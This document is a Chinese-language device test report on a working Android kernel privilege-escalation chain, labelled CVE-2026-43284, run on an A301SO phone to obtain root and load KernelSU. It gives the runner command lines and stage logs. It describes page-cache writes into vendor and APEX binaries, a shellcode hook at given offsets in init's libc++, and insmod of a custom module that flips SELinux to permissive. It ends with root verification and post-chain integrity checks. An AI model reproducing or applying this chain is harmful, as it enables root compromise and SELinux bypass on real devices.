# B5-9h LKM-3 真机门禁：43284 全链 + 自建 LKM — **PASS**

对应提交：`da51711`（hook 接线到 write/trigger/full）+ `e29771c`（LKM 收尾 restore_enforce）。
设备 A301SO / `5.15.189-android13-8-00016-g51bba4309aac-ab14546557`，冷机后 KernelSU 未加载。

## 路径

`DevCve43284Activity`（debug APK，Shizuku uid=2000）→ 原生 staged runner：
`--run-cve-2026-43284 /data/local/tmp/ghostlock.ko /vendor/lib64/libbinderdebug.so --stage=<s>`，
其中 `ghostlock.ko` 是**我们自建的可审计模块**（12304 B，sha256 `d557fe11…`，DDK android13-5.15 构建）。

## 步骤 1：`--stage=write` PASS

```
GLK_STATUS run.module path=/data/local/tmp/ghostlock.ko bytes=12304 wrote=1 verified=1 ko_vermagic=original
GLK_STATUS run.chain written=769 verified=769 rolled_back=0 cleanup=1 journal_overflow=1 rollback_incomplete=0 \
          crash_dump=1 hook_planned=1 hook_armed=1 hook=0 hook_restored=0 hook_error=None
GLK_STATUS run.cve_2026_43284 ok error=None
```

- 769 块（12304 B）写入 vendor 载体并**逐块回读校验**；patch #1（crash_dump64）已应用；hook **已武装未应用**（符合阶段语义）。
- `journal_overflow=1` 如实报告（769 块超出 128 块回滚日志，无法整体回滚；重启复原）。

## 步骤 2：`--stage=trigger` PASS

```
GLK_STATUS run.chain written=769 verified=769 … crash_dump=1 hook_planned=1 hook_armed=1 \
          hook=1 hook_restored=1 hook_error=None
GLK_STATUS run.trigger fired=1 wait_incomplete=0
GLK_STATUS run.wait outcome=LkmLoaded terminus=1 error=None
GLK_STATUS run.cve_2026_43284 ok error=None
```

**事后核验**：

```
$ su -c id
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
$ getenforce
Enforcing
$ grep -c kernelsu /proc/modules
1
```

## 链条实际发生了什么

1. **页缓存写**：`.ko` → `/vendor/lib64/libbinderdebug.so`（769 块）；splicehelper → `/apex/com.android.runtime/bin/crash_dump64`（patch #1）。
2. **hook**：`/system/lib64/libc++.so` 的 `_ZNSt3__113basic_ostream…6sentryC1ERS3_`（`0xb70a8`，跳过 `bti c` 后在 `0xb70ac` 打补丁；`payload_max=2520`、shellcode 480 B）。
3. **trigger**：double-fork 让 init 命中 hook → shellcode 以 `u:r:vendor_modprobe:s0` exec `/vendor/bin/insmod /vendor/lib64/libbinderdebug.so`。
4. **我们的 LKM**：kprobe 取 `kallsyms_lookup_name` → 置 `selinux_state` permissive → `call_usermodehelper` 执行 `/data/local/tmp/.ghostlock_lkm_cmd.sh`（ksud 发现 + KMI 解析 + `ksud late-load --kmi android13-5.15 --allow-shell` + 轮询 marker）→ **收尾把 SELinux 恢复 enforcing** → 返回 `-E2BIG` 自卸载。
5. **结果**：KernelSU 模块加载、`su` 可用、SELinux 回到 Enforcing。

## 判定意义

- 43284 backend 在本机**具备完整可执行链**，且终态模块是**我们自己构建、源码可审计**的（不再依赖上游出处不明的 `.ko`）。
- LKM 的 4 项能力全部经真机验证：符号解析、permissive、UMH 以 root 执行命令、**收尾恢复 enforcing**。
- 下一步：AVB/文件/verity 校验（见配套检查）与可用性翻转（`selection_supported(43284)` / `terminal_available(UmhForward)`）。

## 3. 安全校验（链后）

**文件级**（`avb_guard.sh files-check`，走页缓存、能看见内存改动）：

```
[FAIL] /apex/com.android.runtime/bin/crash_dump64   ← patch #1（页缓存）
[ok]   /system/lib64/libc++.so                      ← hook 已 restore，字节复原
[FAIL] /vendor/lib64/libbinderdebug.so              ← 我们的 .ko 写入载体（页缓存）
summary total=7 ok=3 fail=2 absent=2 new=0 err=0   RESULT=INCONSISTENT
```

即精确捕捉到**恰好两处**页缓存改动，没有其它文件被动过。

**分区级 AVB**（设备端 `avbcheck avb-verify --slot _a`，无密钥重算 hash/hashtree 并校验签名）：

```
# summary ok=12 fail=0 skip=0 err=0 sig_ok=5 sig_fail=0 sig_skip=0
AVB_VERIFY=OK
```

→ **无任何持久性破坏**：页缓存写没有落到块设备（符合设计），重启即完全复原。

